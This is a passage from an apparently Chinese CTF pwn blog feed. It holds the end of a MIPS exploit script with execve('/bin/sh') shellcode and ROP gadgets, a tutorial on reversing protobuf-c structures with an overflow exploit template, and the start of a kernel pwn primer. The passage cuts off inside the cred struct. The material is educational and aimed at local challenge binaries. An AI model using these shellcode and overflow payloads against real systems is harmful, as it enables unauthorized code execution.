<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;mips&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">program = <span class="string">&quot;./mips&quot;</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel-static&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;2333&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, program])</span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    file <span class="subst">&#123;program&#125;</span></span></span><br><span class="line"><span class="string">    target remote 127.0.0.1:2333</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x00427968</span></span><br><span class="line">gadget2 = <span class="number">0x0041FBF4</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">li $v0,0xfab            </span></span><br><span class="line"><span class="string">li $t0,0x0068732f</span></span><br><span class="line"><span class="string">li $t1,0x6e69622f</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t0, 0($sp)</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t1, 0($sp)</span></span><br><span class="line"><span class="string">or $a0,$sp,$zero</span></span><br><span class="line"><span class="string">or $a1,$zero,$zero</span></span><br><span class="line"><span class="string">or $a2,$zero,$zero</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#shellcode = shellcraft.sh()</span></span><br><span class="line">payload = asm(shellcode).ljust(<span class="number">0x40</span>,<span class="string">b&quot;A&quot;</span>) + p32(gadget2) + p32(gadget1) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x58</span> + asm(shellcode)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>mips</tag>
      </tags>
  </entry>
  <entry>
    <title>protobuf初探</title>
    <url>/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h4 id="protobuf简介"><a href="#protobuf简介" class="headerlink" title="protobuf简介"></a>protobuf简介</h4><p>Protocol Buffers（通常简称为protobuf）是由Google开发的一种语言中立、平台中立的序列化结构数据的方法。它用于高效地存储和交换数据，特别适合用于网络通信和数据存储。protobuf的主要特点包括：</p>
<ol>
<li><strong>高效性</strong>：protobuf使用紧凑的二进制格式，比其他文本格式（如JSON或XML）更小、更快。</li>
<li><strong>语言中立</strong>：支持多种编程语言，包括C++、Java、Python、Go等，使得跨平台的数据交换变得简单。</li>
<li><strong>易于扩展</strong>：可以在不破坏现有数据结构的情况下，轻松地添加新字段。</li>
<li><strong>定义文件</strong>：使用<code>.proto</code>文件来定义数据结构和服务，可以通过工具自动生成相应的代码。</li>
</ol>
<p>通过protobuf，开发者可以定义消息类型，使用这些类型进行数据序列化和反序列化，从而在不同的系统或服务之间传输数据。</p>
<p><strong>Proto2</strong>: 支持 <code>required</code> 和 <code>optional</code> 修饰符。</p>
<p><strong>Proto3</strong>: 默认所有字段为 <code>optional</code>，不支持 <code>required</code></p>
<h4 id="工具集安装"><a href="#工具集安装" class="headerlink" title="工具集安装"></a>工具集安装</h4><ul>
<li>pbtk:（自动化分析）</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5</span><br><span class="line">sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client</span><br><span class="line">git clone https://github.com/marin-m/pbtk</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Protobuf 库:（本地搓proto文件并编译成python）</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y protobuf-compiler libprotobuf-dev		</span><br><span class="line">sudo apt-get install libprotobuf-c-dev protobuf-c-compiler</span><br></pre></td></tr></table></figure></div>
<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>protobuf这类题一般都会将输入转化成特殊的结构体，这就要求我们首先要逆向出proto结构体。</p>
<h4 id="一些结构体定义"><a href="#一些结构体定义" class="headerlink" title="一些结构体定义"></a>一些结构体定义</h4><h6 id="ProtobufCFieldDescriptor"><a href="#ProtobufCFieldDescriptor" class="headerlink" title="ProtobufCFieldDescriptor"></a>ProtobufCFieldDescriptor</h6><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026151257848.png"
                      class=""
                >
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line">    <span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>      *name;				</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line">    <span class="type">uint32_t</span>        id;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">    ProtobufCLabel      label;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The type of the field. */</span></span><br><span class="line">    ProtobufCType       type;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment">     * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment">     * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span>        quantifier_offset;							</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment">     * itself.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span>        offset;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A type-specific descriptor.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment">     * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment">     * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>      *descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>      *default_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment">     * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">uint32_t</span>        flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">unsigned</span>        reserved_flags;</span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">void</span>            *reserved2;</span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">void</span>            *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h6 id="label和type"><a href="#label和type" class="headerlink" title="label和type"></a>label和type</h6><p>label和type都是枚举类型：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    <span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment">     * more than one).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment">     * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment">     * preserved.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment">     * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    PROTOBUF_C_TYPE_INT32,      <span class="comment">/**0&lt; int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**1&lt; signed int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**2&lt; signed int32 (4 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_INT64,      <span class="comment">/**3&lt; int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**4&lt; signed int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**5&lt; signed int64 (8 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**6&lt; unsigned int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**7&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**8&lt; unsigned int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**9&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**10&lt; float */</span></span><br><span class="line">    PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**11&lt; double */</span></span><br><span class="line">    PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**12&lt; boolean */</span></span><br><span class="line">    PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**13&lt; enumerated type */</span></span><br><span class="line">    PROTOBUF_C_TYPE_STRING,     <span class="comment">/**14&lt; UTF-8 or ASCII string */</span></span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**15&lt; arbitrary byte sequence */</span></span><br><span class="line">    PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**16&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure></div>
<h4 id="定位结构体方式"><a href="#定位结构体方式" class="headerlink" title="定位结构体方式"></a>定位结构体方式</h4><h5 id="1-手动定位"><a href="#1-手动定位" class="headerlink" title="1.手动定位"></a>1.手动定位</h5><p>因为我们输入的内容会通过<code>protobuf_c_message_unpack</code>这个函数进行解析。所以我们可以对比链接库中的函数具体定义以及我们pwn的主程序中调用的传参。然后就能跳转到主程序中的具体descriptor中进行下一步分析。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144416901.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144538997.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144611512.png"
                      class=""
                >
<p>首先要在主程序里找一个<code>message_descriptor</code>，一般在.data.rel.ro段，其开头的魔数(magic)是0x28AAEEF9，一般而言下面会直接解析出Protobuf结构体的名字，但也有IDA识别不出来的情况，我们可以手动将db类型转为dq类型，然后就会清晰很多。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026143624589.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144134084.png"
                      class=""
                >
<p>我们的消息结构体名字就为<code>MyMessage</code>。接着我们可以往<code>my_message__field_descriptors</code>里看，里面就是具体的字段，也就是<code>ProtobufCFieldDescriptor</code>这个结构体。但是也都被IDA当作了db解析，我们可以按照下表结构体的字段分布进行修改，手动将其解析一下，主要看name，id，label，type，其他怎么改影响不大。一下子就清晰了不少，然后我们就可以对照着枚举表还原出protobuf了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026151257848.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144919768.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026150209780.png"
                      class=""
                >
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//message.proto</span></span><br><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">message MyMessage&#123;</span><br><span class="line">    optional <span class="built_in">string</span> name = <span class="number">1</span>;</span><br><span class="line">    required bytes buffer = <span class="number">3</span>;</span><br><span class="line">    required uint32 size = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后在命令行将其转化成python文件即可</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">protoc --python_out=. message.proto</span><br></pre></td></tr></table></figure></div>
<h5 id="2-自动分析"><a href="#2-自动分析" class="headerlink" title="2.自动分析"></a>2.自动分析</h5><p>首先进入之前安装好的pbtk目录，<code>python3 gui.py</code> 就可以启动一个gui窗口，然后选择<code>Extract .proto structures from apps</code>，就可以选择pwn程序自动提取其中的proto文件了。但有时会不灵，还是手动分析有趣。</p>
<h4 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h4><p>分析完proto的结构，就可以进行exp脚本的编写了，之前我们通过proto生成的python文件名为<code>proto结构体名_pb2</code>，可以先导入exp。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> message_pb2</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p = process(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">......</span><br><span class="line">msg = message_pb2.MyMessage()		<span class="comment">#创建结构体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#各字段赋值</span></span><br><span class="line">msg.name = <span class="string">&#x27;Admin&#x27;</span></span><br><span class="line">msg.buffer = shellcode.ljust(<span class="number">0x208</span>,<span class="string">b&quot;a&quot;</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(tar)</span><br><span class="line">msg.size = <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">payload = msg.SerializeToString()		<span class="comment">#转化成proto的序列化字符串</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
<h4 id="判别proto版本方式"><a href="#判别proto版本方式" class="headerlink" title="判别proto版本方式"></a>判别proto版本方式</h4><p>一般proto分为proto2和proto3两个版本，在写proto文件时要在开头指明<code>syntax=proto2/3</code>。</p>
<p>在proto3中移除了require这个修饰符，如果有的label位为0（required），就说明用的是proto2语法。</p>
<p>其实也可以都带进去试试，总共就两个版本，别的地方没分析错的话总有一个会通过的。</p>
<h4 id="常见问题解决"><a href="#常见问题解决" class="headerlink" title="常见问题解决"></a>常见问题解决</h4><h5 id="1-库找不到"><a href="#1-库找不到" class="headerlink" title="1.库找不到"></a>1.库找不到</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026002833645.png"
                      class=""
                >
<p>可以手动在/usr/lib下添加一个链接</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /mnt/e/ctf/2024shctf/pwn/shctf——challage_pwn_protobuf/libprotobuf-c.so.1 /usr/lib/libprotobuf-c.so.1</span><br></pre></td></tr></table></figure></div>
<h5 id="2-运行exp时因为引入了proto转成的python文件报错"><a href="#2-运行exp时因为引入了proto转成的python文件报错" class="headerlink" title="2.运行exp时因为引入了proto转成的python文件报错"></a>2.运行exp时因为引入了proto转成的python文件报错</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026154314346.png"
                      class=""
                >
<p>提高python库中protobuf的版本</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 uninstall protobuf</span><br><span class="line">pip3 install protobuf==3.19.0</span><br></pre></td></tr></table></figure></div>
<h5 id="3-逆出结构体后prpto一直无法正常解析"><a href="#3-逆出结构体后prpto一直无法正常解析" class="headerlink" title="3.逆出结构体后prpto一直无法正常解析"></a>3.逆出结构体后prpto一直无法正常解析</h5><p>可以尝试把<code>sendline</code>换成<code>send</code>，有时候多一个换行符就解析不出来了。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>protobuf</tag>
      </tags>
  </entry>
  <entry>
    <title>kernel pwn初探</title>
    <url>/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h2 id="kernel-pwn初探"><a href="#kernel-pwn初探" class="headerlink" title="kernel pwn初探"></a>kernel pwn初探</h2><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>基础的概念入门时不宜死磕，最好粗略看看留个印象，然后下去环境配好后，在调试探索时逐步深化理解。</p>
<h5 id="如何理解内核"><a href="#如何理解内核" class="headerlink" title="如何理解内核"></a>如何理解内核</h5><p>操作系统内核（Operation System Kernel）本质上也是一种软件，可以看作是普通应用程式与硬件之间的一层中间层，其主要作用便是调度系统资源、控制 IO 设备、操作网络与文件系统等，并为上层应用提供便捷、抽象的应用接口。操作系统内核实际上是我们抽象出来的一个概念，本质上与用户进程一般无二，都是位于物理内存中的代码 + 数据，不同之处在于当 CPU  执行操作系统内核代码时通常运行在高权限，拥有着完全的硬件访问能力，而 CPU 在执行用户态代码时通常运行在低权限环境，只拥有部分 /  缺失硬件访问能力。</p>
<h5 id="分级保护域"><a href="#分级保护域" class="headerlink" title="分级保护域"></a><strong>分级保护域</strong></h5><p>分级保护域（hierarchical protection domains）又被称作保护环，简称 Rings ，是一种将计算机不同的资源划分至不同权限的模型。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/ring_model.png"
                      class=""
                >
<p>cpu权限等级主要分为0-3四级，基本上常用的只有Ring0和Ring3，对应操作系统内核与用户进程，即 CPU 在执行用户进程代码时处在 ring3 下。</p>
<h5 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h5><ul>
<li>中断与异常</li>
<li>特权级相关指令（iret，sysenter…）</li>
</ul>
<p>现代操作系统的开发者包装出了系统调用（syscall），作为由”用户态 “切换到”  内核态“的入口，从而执行内核代码来完成用户进程所需的一些功能。当用户进程想要请求更高权限的服务时，便需要通过由系统提供的应用接口，使用系统调用以陷入内核态，再由操作系统完成请求。</p>
<p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code> 等事件时，会发生用户态到内核态的切换，具体的过程为：</p>
<ol>
<li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li>
<li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li>
<li>通过 push 保存各寄存器值</li>
<li>通过汇编指令判断是否为 <code>x32_abi</code>。</li>
<li>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</li>
</ol>
<p>退出时，流程如下：</p>
<ol>
<li>通过 <code>swapgs</code> 恢复 GS 值。</li>
<li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）。</li>
</ol>
<h5 id="虚拟内存分布"><a href="#虚拟内存分布" class="headerlink" title="虚拟内存分布"></a>虚拟内存分布</h5><p>分为供用户使用的用户空间和供内核使用的内核空间。</p>
<p>32位内存分布：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/mm_layout_32.png"
                      class=""
                >
<p>64位内存分布：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/mm_layout_64.png"
                      class=""
                >
<h5 id="进程权限管理"><a href="#进程权限管理" class="headerlink" title="进程权限管理"></a>进程权限管理</h5><p><strong>进程描述符</strong>：源码在<code>include/linux/sched.h</code>中，linux-5.15.153该版本部分源码如下，由于task_struct结构体定义极长，这里继续引用ctfwiki上的图片。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/task_struct.png"
                      class=""
                >
<p><strong>重要字段结构化表格</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>类别</th>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>调度相关</strong></td>
<td><code>state</code>, <code>sched_class</code></td>
<td>调度信息</td>
</tr>
<tr>
<td></td>
<td><code>prio</code>, <code>static_prio</code></td>
<td>优先级</td>
</tr>
<tr>
<td></td>
<td><code>se</code>, <code>rt_priority</code></td>
<td>调度器实体</td>
</tr>
<tr>
<td><strong>内存管理</strong></td>
<td><code>mm</code>, <code>active_mm</code></td>
<td>内存描述符</td>
</tr>
<tr>
<td></td>
<td><code>stack</code>, <code>thread_info</code></td>
<td>内核栈与线程信息</td>
</tr>
<tr>
<td><strong>标识与控制</strong></td>
<td><code>pid</code>, <code>tgid</code></td>
<td>进程与线程组 ID</td>
</tr>
<tr>
<td></td>
<td><code>real_parent</code>, <code>children</code></td>
<td>父子关系管理</td>
</tr>
<tr>
<td><strong>资源管理</strong></td>
<td><code>files</code>, <code>fs</code>, <code>signal</code></td>
<td>文件、文件系统与信号资源</td>
</tr>
<tr>
<td></td>
<td><code>cred</code>, <code>limits</code></td>
<td>权限与资源限制</td>
</tr>
<tr>
<td><strong>统计与架构相关</strong></td>
<td><code>utime</code>, <code>stime</code></td>
<td>CPU 时间</td>
</tr>
<tr>
<td></td>
<td><code>cpu_context</code>, <code>thread</code></td>
<td>上下文信息</td>
</tr>
<tr>
<td><strong>安全与调试</strong></td>
<td><code>ptrace</code>, <code>seccomp</code></td>
<td>调试与安全机制</td>
</tr>
</tbody>
</table>
</div>
<p><strong>进程权限凭证</strong>（credential）</p>
<p>结构体 <code>cred</code> 用以管理一个进程的权限，该结构体定义于内核源码 <code>include/linux/cred.h</code> 中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_long_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span> *<span class="title">ucounts</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion 